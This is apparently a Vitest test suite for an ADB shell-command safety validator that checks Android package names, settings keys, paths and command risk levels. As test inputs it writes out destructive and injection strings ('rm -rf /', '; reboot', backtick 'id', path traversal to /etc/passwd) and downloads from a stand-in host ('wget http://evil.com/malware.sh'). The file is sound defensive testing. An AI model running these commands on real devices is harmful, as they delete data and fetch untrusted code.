import { describe, it, expect } from "vitest";
import {
  validatePackageName,
  validateSettingsKey,
  validateRemotePath,
  evaluateCommand,
  buildShellCommand,
  cleanAdbPrefix,
} from "./adbSafety";

describe("ADB Safety Layer Tests", () => {
  describe("validatePackageName", () => {
    it("should validate correct package names", () => {
      expect(validatePackageName("com.android.settings")).toBe(true);
      expect(validatePackageName("com.example.my_app123")).toBe(true);
      expect(validatePackageName("a.b.c")).toBe(true);
    });

    it("should invalidate incorrect package names", () => {
      expect(validatePackageName("")).toBe(false);
      expect(validatePackageName("com")).toBe(false); // must have at least one dot
      expect(validatePackageName("com.settings; rm -rf /")).toBe(false); // space & semicolon
      expect(validatePackageName("1com.settings")).toBe(false); // starts with number
      expect(validatePackageName("a".repeat(130))).toBe(false); // too long
    });
  });

  describe("validateSettingsKey", () => {
    it("should validate correct settings keys", () => {
      expect(validateSettingsKey("window_animation_scale")).toBe(true);
      expect(validateSettingsKey("pointer_speed")).toBe(true);
      expect(validateSettingsKey("development_settings_enabled")).toBe(true);
    });

    it("should invalidate incorrect settings keys", () => {
      expect(validateSettingsKey("")).toBe(false);
      expect(validateSettingsKey("pointer speed")).toBe(false); // contains space
      expect(validateSettingsKey("key; reboot")).toBe(false); // command injection attempt
      expect(validateSettingsKey("a".repeat(130))).toBe(false); // too long
    });
  });

  describe("validateRemotePath", () => {
    it("should validate safe remote paths", () => {
      expect(validateRemotePath("/sdcard/Download/test.apk")).toBe(true);
      expect(validateRemotePath("/storage/emulated/0/DCIM")).toBe(true);
      expect(validateRemotePath("/data/local/tmp/app.apk")).toBe(true);
    });

    it("should invalidate unsafe remote paths", () => {
      expect(validateRemotePath("")).toBe(false);
      expect(validateRemotePath("/sdcard/Download/../../etc/passwd")).toBe(
        false,
      ); // path traversal
      expect(validateRemotePath("/system/build.prop")).toBe(false);
      expect(validateRemotePath("/")).toBe(false);
      expect(validateRemotePath("/sdcard/Download/file.txt; rm -rf /")).toBe(
        false,
      ); // command injection
      expect(validateRemotePath('/sdcard/Download/file"; reboot; "')).toBe(
        false,
      ); // quote breakout
      expect(validateRemotePath("/sdcard/`id`")).toBe(false); // backticks
      expect(validateRemotePath("/a".repeat(520))).toBe(false); // too long
    });
  });

  describe("evaluateCommand", () => {
    it("should properly evaluate empty commands", () => {
      const res = evaluateCommand("");
      expect(res.allowed).toBe(false);
      expect(res.reason).toContain("Lệnh rỗng");
    });

    it("should evaluate reboot commands", () => {
      const res = evaluateCommand("reboot");
      expect(res.allowed).toBe(true);
      expect(res.risk).toBe("MEDIUM");
      expect(res.mode).toBe("REBOOT_OP");
    });

    it("should evaluate settings put commands", () => {
      // safe setting
      const res1 = evaluateCommand("settings put system pointer_speed 0");
      expect(res1.allowed).toBe(true);
      expect(res1.risk).toBe("SAFE");
      expect(res1.mode).toBe("WRITE_SETTING");

      // risky setting
      const res2 = evaluateCommand(
        "settings put global background_process_limit 2",
      );
      expect(res2.allowed).toBe(true);
      expect(res2.risk).toBe("RISKY");
      expect(res2.mode).toBe("WRITE_SETTING");

      // invalid setting namespace
      const res3 = evaluateCommand("settings put invalid_ns key val");
      expect(res3.allowed).toBe(false);
      expect(res3.risk).toBe("DANGEROUS");

      // command injection settings key
      const res4 = evaluateCommand("settings put system key;reboot val");
      expect(res4.allowed).toBe(false);
      expect(res4.risk).toBe("DANGEROUS");
    });

    it("should evaluate settings get commands", () => {
      const res = evaluateCommand("settings get global adb_enabled");
      expect(res.allowed).toBe(true);
      expect(res.risk).toBe("SAFE");
      expect(res.mode).toBe("READ_ONLY");
    });

    it("should evaluate pm package commands", () => {
      // safe pm list
      const res1 = evaluateCommand("pm list packages");
      expect(res1.allowed).toBe(true);
      expect(res1.risk).toBe("SAFE");

      // uninstall package with invalid name
      const res2 = evaluateCommand("pm uninstall invalid_pkg_name;");
      expect(res2.allowed).toBe(false);
      expect(res2.risk).toBe("DANGEROUS");

      // uninstall package with valid name
      const res3 = evaluateCommand("pm uninstall com.example.app");
      expect(res3.allowed).toBe(true);
      expect(res3.risk).toBe("RISKY");
    });

    it("should evaluate file operation commands", () => {
      // dangerous root deletion
      const res1 = evaluateCommand("rm -rf /");
      expect(res1.allowed).toBe(false);
      expect(res1.risk).toBe("DANGEROUS");

      // normal deletion
      const res2 = evaluateCommand("rm -rf /sdcard/Download/temp");
      expect(res2.allowed).toBe(true);
      expect(res2.risk).toBe("RISKY");
    });

    it("should block unknown/unlisted commands by default (deny-by-default)", () => {
      const res1 = evaluateCommand("some_random_command");
      expect(res1.allowed).toBe(false);
      expect(res1.risk).toBe("DANGEROUS");
      expect(res1.reason).toContain("không nằm trong danh sách cho phép");

      const res2 = evaluateCommand("curl http://evil.com");
      expect(res2.allowed).toBe(false);
      expect(res2.risk).toBe("DANGEROUS");

      const res3 = evaluateCommand("wget http://evil.com/malware.sh");
      expect(res3.allowed).toBe(false);
      expect(res3.risk).toBe("DANGEROUS");
    });

    it("should allow whitelisted safe read-only commands", () => {
      const r1 = evaluateCommand("getprop ro.build.version.sdk");
      expect(r1.allowed).toBe(true);
      expect(r1.risk).toBe("SAFE");

      const r2 = evaluateCommand("dumpsys battery");
      expect(r2.allowed).toBe(true);
      expect(r2.risk).toBe("SAFE");

      const r3 = evaluateCommand("cat /proc/cpuinfo");
      expect(r3.allowed).toBe(true);
      expect(r3.risk).toBe("SAFE");

      const r4 = evaluateCommand("ls /sdcard/");
      expect(r4.allowed).toBe(true);
      expect(r4.risk).toBe("SAFE");

      const r5 = evaluateCommand("wm size");
      expect(r5.allowed).toBe(true);
      expect(r5.risk).toBe("SAFE");

      const r6 = evaluateCommand("getenforce");
      expect(r6.allowed).toBe(true);
      expect(r6.risk).toBe("SAFE");

      const r7 = evaluateCommand("id");
      expect(r7.allowed).toBe(true);
      expect(r7.risk).toBe("SAFE");
    });

    it("should allow whitelisted safe pm commands", () => {
      const r1 = evaluateCommand("pm list packages -3");
      expect(r1.allowed).toBe(true);
      expect(r1.risk).toBe("SAFE");

      const r2 = evaluateCommand("pm path com.android.settings");
      expect(r2.allowed).toBe(true);
      expect(r2.risk).toBe("SAFE");

      const r3 = evaluateCommand("pm dump com.android.settings");
      expect(r3.allowed).toBe(true);
      expect(r3.risk).toBe("SAFE");
    });

    it("should allow whitelisted safe cmd/activity commands", () => {
      const r1 = evaluateCommand("am start -n com.android.settings/.Settings");
      expect(r1.allowed).toBe(true);
      expect(r1.risk).toBe("MEDIUM");

      const r2 = evaluateCommand("input tap 500 500");
      expect(r2.allowed).toBe(true);
      expect(r2.risk).toBe("MEDIUM");

      const r3 = evaluateCommand("svc wifi enable");
      expect(r3.allowed).toBe(true);
      expect(r3.risk).toBe("MEDIUM");

      const r4 = evaluateCommand("cmd power set-mode 1");
      expect(r4.allowed).toBe(true);
      expect(r4.risk).toBe("MEDIUM");

      const r5 = evaluateCommand("service call activity 134 i32 1");
      expect(r5.allowed).toBe(true);
      expect(r5.risk).toBe("MEDIUM");
    });

    it("should allow newly added experience commands", () => {
      const c1 = evaluateCommand("settings put global task_stack_view_layout_style 2");
      expect(c1.allowed).toBe(true);

      const c2 = evaluateCommand("settings put global status_bar_show_smart_island 1");
      expect(c2.allowed).toBe(true);

      const c3 = evaluateCommand("settings put global status_bar_show_capsule 1");
      expect(c3.allowed).toBe(true);

      const c4 = evaluateCommand("settings put secure show_keyboard_shortcuts_helper 0");
      expect(c4.allowed).toBe(true);

      const c5 = evaluateCommand("settings put global policy_control immersive.full=*");
      expect(c5.allowed).toBe(true);

      const c6 = evaluateCommand("settings put global hide_gesture_line 1");
      expect(c6.allowed).toBe(true);
    });

    it("should allow pm enable and pm install-existing commands", () => {
      const c1 = evaluateCommand("pm enable com.miui.daemon");
      expect(c1.allowed).toBe(true);
      expect(c1.mode).toBe("PACKAGE_OP");

      const c2 = evaluateCommand("pm install-existing --user 0 com.miui.systemAdSolution");
      expect(c2.allowed).toBe(true);
      expect(c2.mode).toBe("PACKAGE_OP");
    });

    it("should allow settings list as read-only", () => {
      const c1 = evaluateCommand("settings list global");
      expect(c1.allowed).toBe(true);
      expect(c1.mode).toBe("READ_ONLY");
    });

    it("should allow fallback commands for experience items", () => {
      // Fallback cho FPS show
      const c1 = evaluateCommand("settings put system fps_show 1");
      expect(c1.allowed).toBe(true);

      // Fallback cho dark mode
      const c2 = evaluateCommand("settings put secure ui_night_mode 2");
      expect(c2.allowed).toBe(true);

      // Fallback cho refresh rate
      const c3 = evaluateCommand("settings put system screen_refresh_rate 120");
      expect(c3.allowed).toBe(true);

      // cmd power set-mode
      const c4 = evaluateCommand("cmd power set-mode 2");
      expect(c4.allowed).toBe(true);
    });
  });

  describe("buildShellCommand", () => {
    it("should build command with safe arguments", () => {
      const cmd = buildShellCommand("pm uninstall {package}", {
        package: "com.example.app",
      });
      expect(cmd).toBe("pm uninstall com.example.app");
    });

    it("should throw error for unsafe arguments", () => {
      // unsafe package
      expect(() =>
        buildShellCommand("pm uninstall {package}", {
          package: "com.example.app; reboot",
        }),
      ).toThrow();

      // unsafe remote path
      expect(() =>
        buildShellCommand("rm -rf {path}", { path: "/sdcard/../../etc" }),
      ).toThrow();

      // unsafe standard variable with dangerous chars
      expect(() =>
        buildShellCommand("echo {val}", { val: "hello; rm -rf /" }),
      ).toThrow();
    });
  });

  describe("cleanAdbPrefix", () => {
    it("should clean single and redundant adb shell, shell, adb prefixes", () => {
      expect(cleanAdbPrefix("adb shell settings put global show_refresh_rate 1")).toBe("settings put global show_refresh_rate 1");
      expect(cleanAdbPrefix("adb shell adb shell settings put global show_refresh_rate 1")).toBe("settings put global show_refresh_rate 1");
      expect(cleanAdbPrefix("shell settings put global show_refresh_rate 1")).toBe("settings put global show_refresh_rate 1");
      expect(cleanAdbPrefix("adb settings put global show_refresh_rate 1")).toBe("settings put global show_refresh_rate 1");
      expect(cleanAdbPrefix("  adb shell   shell   settings put global show_refresh_rate 1  ")).toBe("settings put global show_refresh_rate 1");
      expect(cleanAdbPrefix("settings put global show_refresh_rate 1")).toBe("settings put global show_refresh_rate 1");
    });
  });
});
